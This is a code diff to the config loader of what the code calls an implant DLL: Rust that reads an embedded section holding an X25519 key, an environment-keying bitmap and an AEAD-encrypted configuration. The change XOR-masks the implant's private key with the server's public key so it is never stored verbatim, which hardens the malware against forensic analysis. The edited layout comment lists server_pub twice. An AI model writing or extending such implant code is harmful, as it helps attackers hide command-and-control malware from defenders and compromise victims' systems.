@@ -9,9 +9,10 @@
 //! [keying_levels    (4B LE)]  -- env-keying bitmap (0 = disabled)
 //! [config_data_len  (2B LE)]  -- ct + tag bytes (N+16)
 //! [config_nonce     (12B)]
-//! [implant_priv     (32B)]    -- per-implant X25519 private key (stored in
-//!                                 plaintext; the DLL binary is the protection
-//!                                 layer — stripped symbols + encrypted section)
+//! [implant_priv     (32B)]    -- per-implant X25519 private key, XOR-masked
+//!                                 with server_pub (H11: the raw scalar is not
+//!                                 stored verbatim; unmasked at load time)
+//! [server_pub       (32B)]    -- server's X25519 public key
 //! [server_pub       (32B)]    -- server's X25519 public key
 //! [encrypted_config (N B)]    -- ChaCha20-Poly1305 AEAD
 //! [poly1305_tag     (16B)]
@@ -20,8 +21,10 @@
 //!
 //! ## Key recovery
 //!
-//! Both `implant_priv` and `server_pub` are stored directly in the section
-//! (bytes 22..86). The config key is derived as:
+//! `server_pub` is stored directly in the section (bytes 54..86).
+//! `implant_priv` is stored XOR-masked with `server_pub` at bytes 22..54 (the
+//! raw scalar is never written verbatim — see H11). The config key is derived
+//! as:
 //!
 //! 1. config_key = ECDH(implant_priv, server_pub) + HKDF-SHA256
 //!
@@ -78,8 +81,7 @@ impl Default for ImplantConfig {
 /// Returns `(Config, ImplantConfig, plaintext_bytes)`.
 /// The caller MUST register the plaintext bytes with `mem::register_owned` to
 /// keep them in maskable memory.
-pub fn load_runtime_config(
-) -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
+pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
     let ptr = unsafe { &NYX_CFG_PLACEHOLDER as *const u8 };
     let section = unsafe { core::slice::from_raw_parts(ptr, 1024) };
 
@@ -109,16 +111,23 @@ pub fn load_runtime_config(
     // Read config nonce (12B at bytes 10-21).
     let config_nonce: [u8; 12] = section[10..22].try_into().ok()?;
 
-    // Read implant_priv directly from section[22..54] (no XOR, no fragments).
-    let mut implant_priv = [0u8; 32];
-    implant_priv.copy_from_slice(&section[22..54]);
-
-    // Read server_pub from section[54..86].
+    // Read server_pub from section[54..86] FIRST (needed to unmask implant_priv).
     let mut server_pub = [0u8; 32];
     server_pub.copy_from_slice(&section[54..86]);
 
+    // SECURITY (H11): implant_priv is stored XOR-masked with server_pub. Read
+    // the masked bytes from section[22..54], then un-XOR with server_pub. The
+    // server_pub read above MUST happen before this unmask step.
+    let mut implant_priv = [0u8; 32];
+    implant_priv.copy_from_slice(&section[22..54]);
+    for i in 0..32 {
+        implant_priv[i] ^= server_pub[i];
+    }
+
     // Read encrypted config at bytes 86..86+data_len.
-    if 86 + data_len > 1024 { return None; }
+    if 86 + data_len > 1024 {
+        return None;
+    }
     let ct_with_tag = &section[86..86 + data_len];
 
     // Derive config_key via ECDH(implant_priv, server_pub) + HKDF-SHA256.
